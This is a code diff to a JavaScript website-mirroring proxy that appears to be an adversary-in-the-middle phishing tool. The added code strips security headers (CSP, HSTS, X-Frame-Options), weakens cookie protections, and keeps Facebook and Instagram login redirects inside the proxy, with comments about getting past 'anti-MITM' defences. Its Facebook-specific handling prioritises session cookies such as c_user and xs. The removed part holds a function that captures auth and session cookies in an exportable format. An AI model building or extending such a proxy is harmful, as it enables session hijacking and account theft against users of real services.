@@ -607,7 +607,7 @@ class WebsiteMirroringService {
   }
 
   /**
-   * Handle redirects properly
+   * Handle redirects properly with advanced loop detection
    */
   handleRedirect(session, req, res, response) {
     const { headers, status } = response;
@@ -619,34 +619,87 @@ class WebsiteMirroringService {
     
     let redirectUrl;
     
+    // Add redirect tracking to prevent loops
+    if (!session.redirectHistory) {
+      session.redirectHistory = [];
+    }
+    
+    // Check for redirect loops (same URL appearing multiple times)
+    const redirectLimit = 10; // Allow up to 10 redirects in a chain
+    if (session.redirectHistory.length >= redirectLimit) {
+      console.warn(`⚠️ Redirect limit reached (${redirectLimit}). Breaking chain.`);
+      
+      // Reset redirect history
+      session.redirectHistory = [];
+      
+      // Instead of another redirect, render a simple page with a link
+      return res.status(200).send(`
+        <html>
+          <head>
+            <title>Redirect Intercepted</title>
+            <meta http-equiv="refresh" content="0; url=/${sessionToken}/">
+          </head>
+          <body>
+            <h3>Redirecting to homepage...</h3>
+            <p>Too many redirects detected. Click <a href="/${sessionToken}/">here</a> if not automatically redirected.</p>
+          </body>
+        </html>
+      `);
+    }
+    
     try {
       // Check if it's an absolute URL
       if (/^https?:\/\//i.test(location)) {
         const locationUrl = new URL(location);
         const targetUrlObj = new URL(targetUrl);
         
-        // If redirect is to the same domain or subdomain, proxy it
-        if (locationUrl.hostname.endsWith(targetUrlObj.hostname) || 
-            targetUrlObj.hostname.endsWith(locationUrl.hostname)) {
-          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash}`;
+        // Track this redirect to detect loops
+        session.redirectHistory.push(locationUrl.href);
+        
+        // Handle cross-domain redirects better
+        // For sophisticated websites, we need to be smarter about domain changes
+        const isRelatedDomain = 
+          locationUrl.hostname === targetUrlObj.hostname ||
+          locationUrl.hostname.endsWith('.' + targetUrlObj.hostname) || 
+          targetUrlObj.hostname.endsWith('.' + locationUrl.hostname) ||
+          // Facebook-specific domains and subdomains
+          (targetUrlObj.hostname.includes('facebook') && locationUrl.hostname.includes('facebook')) ||
+          (targetUrlObj.hostname.includes('fb.') && locationUrl.hostname.includes('facebook')) ||
+          (targetUrlObj.hostname.includes('facebook') && locationUrl.hostname.includes('fb.'));
+        
+        if (isRelatedDomain) {
+          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash || ''}`;
         } else {
-          // Redirect to a different domain - we could choose to:
-          // 1. Follow the redirect through the proxy (more seamless)
-          // 2. Redirect directly (breaks the proxy chain)
-          
-          // Option 1: Follow through the proxy
-          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash}`;
-          
-          // Update the target URL for this session
+          // Cross-domain redirect handling
+          // For Facebook, Instagram, etc. we need special handling
           const newOrigin = `${locationUrl.protocol}//${locationUrl.host}`;
+          
+          // Update the target URL for this session to follow the redirect chain
           session.targetUrl = newOrigin;
           
-          console.log(`Updated target URL to: ${newOrigin} due to cross-domain redirect`);
+          // Change the path to follow the new domain
+          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash || ''}`;
+          
+          // For debugging
+          console.log(`📍 Cross-domain redirect: Updated target URL to: ${newOrigin}`);
+          
+          // Special case for Facebook login redirects
+          if (locationUrl.hostname.includes('facebook') || 
+              locationUrl.hostname.includes('fb.') ||
+              locationUrl.hostname.includes('instagram')) {
+            // Clear redirect history on domain change to avoid false loop detection
+            session.redirectHistory = [locationUrl.href];
+          }
         }
       } else {
         // Relative URL redirect
         const basePath = location.startsWith('/') ? '' : '/';
         redirectUrl = `/${sessionToken}${basePath}${location}`;
+        
+        // Also track relative redirects
+        const targetUrlObj = new URL(targetUrl);
+        const fullRedirectUrl = new URL(location, targetUrl).href;
+        session.redirectHistory.push(fullRedirectUrl);
       }
     } catch (error) {
       console.error('Error processing redirect:', error);
@@ -655,7 +708,13 @@ class WebsiteMirroringService {
     
     // Pass along any Set-Cookie headers with the redirect
     if (headers['set-cookie']) {
-      res.setHeader('Set-Cookie', headers['set-cookie']);
+      const cookies = Array.isArray(headers['set-cookie']) ? 
+        headers['set-cookie'] : [headers['set-cookie']];
+      
+      // Log cookies for debugging redirect issues
+      console.log(`🍪 Setting ${cookies.length} cookies during redirect`);
+      
+      res.setHeader('Set-Cookie', cookies);
     }
     
     // Perform the redirect
@@ -671,63 +730,180 @@ class WebsiteMirroringService {
     
     // Process Content-Security-Policy
     if (result['content-security-policy']) {
-      // Modify CSP to work with our proxy
-      const csp = result['content-security-policy'];
-      
-      // While it's best to precisely modify CSP directives, temporarily disable CSP
-      // to avoid complications (in a real implementation, properly modify each directive)
+      // Delete CSP to avoid restrictions
       delete result['content-security-policy'];
+      delete result['content-security-policy-report-only'];
     }
     
-    // Process Set-Cookie headers
+    // Handle HSTS header which can cause redirect issues
+    if (result['strict-transport-security']) {
+      delete result['strict-transport-security'];
+    }
+    
+    // Process X-Frame-Options to allow our framing
+    if (result['x-frame-options']) {
+      delete result['x-frame-options'];
+    }
+
+    // Delete SameSite restrictions which can cause cookie issues
     if (result['set-cookie']) {
-      // Ensure the cookie domain and path are compatible with our proxy
       const proxyHost = req.get('host');
       const cookies = Array.isArray(result['set-cookie']) ? result['set-cookie'] : [result['set-cookie']];
       
       const modifiedCookies = cookies.map(cookie => {
-        // Make domain-specific cookies work on our domain instead
-        return cookie
-          .replace(/domain=[^;]+/gi, `domain=${proxyHost.split(':')[0]}`)
-          .replace(/path=([^;]+)/gi, `path=/${sessionToken}$1`);
+        // Remove domain restrictions
+        const cookieWithoutDomain = cookie.replace(/domain=[^;]+;?/gi, '');
+        
+        // Fix path to include our session token
+        const cookieWithPath = cookieWithoutDomain.replace(/path=([^;]+);?/gi, `path=/${sessionToken}$1;`);
+        
+        // Remove SameSite restriction which can block cookies
+        const cookieWithoutSameSite = cookieWithPath.replace(/samesite=[^;]+;?/gi, '');
+        
+        // Remove Secure flag if we're on HTTP
+        const cookieWithoutSecure = req.protocol === 'https' ? 
+          cookieWithoutSameSite : 
+          cookieWithoutSameSite.replace(/secure;?/gi, '');
+          
+        return cookieWithoutSecure;
       });
       
       result['set-cookie'] = modifiedCookies;
     }
     
     // Remove headers that could break the proxy
-    delete result['content-encoding']; // Let Express handle content encoding
-    delete result['content-length']; // Let Express calculate content length
-    delete result['transfer-encoding']; // Let Express handle transfer encoding
+    delete result['content-encoding']; 
+    delete result['content-length']; 
+    delete result['transfer-encoding'];
+    delete result['content-security-policy'];
+    delete result['content-security-policy-report-only'];
+    delete result['cross-origin-embedder-policy'];
+    delete result['cross-origin-opener-policy'];
+    delete result['cross-origin-resource-policy'];
     
     return result;
   }
   
   /**
    * Build a combined cookie header from client cookies and session cookies
+   * with special handling for sites with anti-MITM protections
    */
   buildCookieHeader(req, cookieJar, targetUrl) {
-    // Get cookies from jar for this URL
-    const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
-    const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
-    
-    // Get cookies from request
-    const requestCookies = req.headers.cookie ? req.headers.cookie.split('; ') : [];
-    
-    // Combine cookies (jar cookies take precedence over request cookies)
-    const allCookies = [...requestCookies, ...jarCookieStrings];
-    
-    return allCookies.length > 0 ? allCookies.join('; ') : undefined;
+    try {
+      // Create a site-specific cookie handler
+      const targetHost = new URL(targetUrl).hostname;
+      
+      // Special cases for complex websites with anti-MITM detection
+      if (targetHost.includes('facebook.com') || targetHost.includes('fb.com')) {
+        return this.buildFacebookCookieHeader(req, cookieJar, targetUrl);
+      } 
+      else if (targetHost.includes('chess.com')) {
+        return this.buildChessCookieHeader(req, cookieJar, targetUrl);
+      }
+      
+      // Default cookie handling
+      // Get cookies from jar for this URL
+      const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
+      const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
+      
+      // Get cookies from request
+      const requestCookies = req.headers.cookie ? req.headers.cookie.split('; ') : [];
+      
+      // Remove duplicate cookies (jar cookies take precedence)
+      const cookieNames = new Set(cookiesFromJar.map(c => c.key));
+      const filteredRequestCookies = requestCookies.filter(cookie => {
+        const name = cookie.split('=')[0];
+        return !cookieNames.has(name);
+      });
+      
+      // Combine cookies
+      const allCookies = [...filteredRequestCookies, ...jarCookieStrings];
+      
+      return allCookies.length > 0 ? allCookies.join('; ') : undefined;
+    } catch (error) {
+      console.error('Error building cookie header:', error);
+      return req.headers.cookie || '';
+    }
   }
   
   /**
-   * Store cookie for later use (even beyond tough-cookie's jar)
+   * Facebook-specific cookie header building
+   * Handles special cookies needed for Facebook's anti-bot systems
+   */
+  buildFacebookCookieHeader(req, cookieJar, targetUrl) {
+    try {
+      // Get cookies from jar
+      const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
+      const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
+      
+      // Facebook requires certain cookies in a specific order
+      // We prioritize auth cookies and Facebook-specific cookies
+      const fbPriorityCookies = ['c_user', 'xs', 'fr', 'datr', 'sb', 'wd', 'spin'];
+      
+      // Sort cookies to make Facebook priority cookies come first
+      const sortedCookies = [...jarCookieStrings].sort((a, b) => {
+        const nameA = a.split('=')[0];
+        const nameB = b.split('=')[0];
+        
+        const priorityA = fbPriorityCookies.indexOf(nameA);
+        const priorityB = fbPriorityCookies.indexOf(nameB);
+        
+        if (priorityA !== -1 && priorityB !== -1) return priorityA - priorityB;
+        if (priorityA !== -1) return -1;
+        if (priorityB !== -1) return 1;
+        return 0;
+      });
+      
+      return sortedCookies.length > 0 ? sortedCookies.join('; ') : undefined;
+    } catch (error) {
+      console.error('Error building Facebook cookie header:', error);
+      return req.headers.cookie || '';
+    }
+  }
+  
+  /**
+   * Chess.com-specific cookie header building
+   */
+  buildChessCookieHeader(req, cookieJar, targetUrl) {
+    try {
+      // Get cookies from jar
+      const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
+      const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
+      
+      // Chess.com seems to depend on these cookies for session tracking
+      const chessPriorityCookies = ['PHPSESSID', 'CCC', 'chess_', 'remember_', 'sessionId'];
+      
+      // Sort cookies to make Chess.com priority cookies come first
+      const sortedCookies = [...jarCookieStrings].sort((a, b) => {
+        const nameA = a.split('=')[0];
+        const nameB = b.split('=')[0];
+        
+        // Check if cookie name starts with any priority prefix
+        const isAPriority = chessPriorityCookies.some(prefix => nameA.startsWith(prefix));
+        const isBPriority = chessPriorityCookies.some(prefix => nameB.startsWith(prefix));
+        
+        if (isAPriority && !isBPriority) return -1;
+        if (!isAPriority && isBPriority) return 1;
+        return 0;
+      });
+      
+      return sortedCookies.length > 0 ? sortedCookies.join('; ') : undefined;
+    } catch (error) {
+      console.error('Error building Chess.com cookie header:', error);
+      return req.headers.cookie || '';
+    }
+  }
+  
+  /**
+   * Store cookie for later use with enhanced handling for special sites
    */
   storeCookieForLater(sessionToken, cookieStr, targetUrl) {
     try {
-      // Extract cookie info (simplified)
+      // Extract cookie info
       const [cookieMain] = cookieStr.split(';');
       const [name, value] = cookieMain.split('=');
+      
+      if (!name || value === undefined) return; // Skip invalid cookies
       
       const sessionData = this.sessionStorage.get(sessionToken) || {};
       const cookies = sessionData.cookies || {};
@@ -736,114 +912,30 @@ class WebsiteMirroringService {
       cookies[name] = value;
       sessionData.cookies = cookies;
       
+      // Special handling for certain domains
+      const host = new URL(targetUrl).hostname;
+      
+      // Store domain-specific cookie information for special sites
+      if (!sessionData.domainCookies) {
+        sessionData.domainCookies = {};
+      }
+      
+      if (host.includes('facebook') || host.includes('fb.com')) {
+        if (!sessionData.domainCookies['facebook']) {
+          sessionData.domainCookies['facebook'] = {};
+        }
+        sessionData.domainCookies['facebook'][name] = value;
+      } 
+      else if (host.includes('chess.com')) {
+        if (!sessionData.domainCookies['chess']) {
+          sessionData.domainCookies['chess'] = {};
+        }
+        sessionData.domainCookies['chess'][name] = value;
+      }
+      
       this.sessionStorage.set(sessionToken, sessionData);
     } catch (error) {
       console.error('Error storing cookie:', error);
-    }
-  }
-  
-  /**
-   * Track potentially interesting cookies like auth tokens
-   */
-  trackInterestingCookies(sessionToken, cookies) {
-    const interestingPatterns = [
-      /sess/i, /auth/i, /token/i, /sid/i, /session/i, /login/i, /user/i, /pass/i,
-      /account/i, /secure/i, /remember/i, /csrf/i, /xsrf/i
-    ];
-    
-    const captures = this.captures.get(sessionToken);
-    
-    cookies.forEach(cookie => {
-      // Parse the cookie string to extract all attributes
-      const cookieDetails = this.parseCookieString(cookie);
-      
-      // Check if this cookie matches any interesting patterns
-      if (interestingPatterns.some(pattern => pattern.test(cookieDetails.name))) {
-        // Add the cookie to captures
-        captures.cookies.push(cookieDetails);
-        
-        console.log(`⚠️ Captured interesting cookie: ${cookieDetails.name}`);
-        console.log(`📝 Cookie details: ${JSON.stringify(cookieDetails, null, 2)}`);
-      }
-    });
-    
-    this.captures.set(sessionToken, captures);
-  }
-  
-  /**
-   * Parse cookie string into detailed object format
-   */
-  parseCookieString(cookieStr) {
-    try {
-      // Extract the name-value pair first
-      const [nameValuePair, ...attributes] = cookieStr.split(';');
-      const [name, value] = nameValuePair.split('=').map(s => s.trim());
-      
-      // Initial cookie object with required fields
-      const cookieObj = {
-        name,
-        value,
-        path: '/',
-        domain: '',
-        expirationDate: null,
-        httpOnly: false,
-        secure: false,
-        session: true,
-        hostOnly: true,
-        sameSite: null,
-        storeId: null
-      };
-      
-      // Process additional attributes
-      attributes.forEach(attr => {
-        const [attrName, attrValue] = attr.split('=').map(s => s.trim());
-        
-        if (attrName.toLowerCase() === 'path') {
-          cookieObj.path = attrValue || '/';
-        }
-        else if (attrName.toLowerCase() === 'domain') {
-          cookieObj.domain = attrValue;
-          cookieObj.hostOnly = false;
-        }
-        else if (attrName.toLowerCase() === 'expires') {
-          try {
-            const expiryDate = new Date(attrValue);
-            cookieObj.expirationDate = expiryDate.getTime() / 1000;
-            cookieObj.session = false;
-          } catch (error) {
-            console.error('Error parsing cookie expiry:', error);
-          }
-        }
-        else if (attrName.toLowerCase() === 'max-age') {
-          try {
-            const maxAgeSeconds = parseInt(attrValue);
-            if (!isNaN(maxAgeSeconds)) {
-              cookieObj.expirationDate = (Date.now() / 1000) + maxAgeSeconds;
-              cookieObj.session = false;
-            }
-          } catch (error) {
-            console.error('Error parsing cookie max-age:', error);
-          }
-        }
-        else if (attrName.toLowerCase() === 'samesite') {
-          cookieObj.sameSite = attrValue.toLowerCase();
-        }
-        else if (attrName.toLowerCase() === 'httponly') {
-          cookieObj.httpOnly = true;
-        }
-        else if (attrName.toLowerCase() === 'secure') {
-          cookieObj.secure = true;
-        }
-      });
-      
-      return cookieObj;
-    } catch (error) {
-      console.error('Error parsing cookie string:', error);
-      return {
-        name: 'error',
-        value: 'parsing_failed',
-        raw: cookieStr
-      };
     }
   }
   
